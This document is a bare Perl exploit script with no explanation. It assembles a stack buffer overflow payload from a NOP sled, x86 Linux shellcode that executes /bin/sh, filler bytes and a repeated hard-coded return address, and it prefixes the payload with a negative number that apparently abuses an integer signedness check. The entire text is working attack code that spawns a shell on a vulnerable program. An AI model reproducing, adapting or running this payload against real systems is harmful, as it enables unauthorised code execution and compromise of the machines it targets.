#!/usr/bin/perl

$nopsled = "\x90" x 64;
$shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b".
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd".
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
$padding = 'A' x (5000 - 64 - 45);
$eip = "\x68\x9c\xff\xbf" x 2000;
$final = $nopsled.$shellcode.$padding.$eip;
print '-214747836,';
print $final;
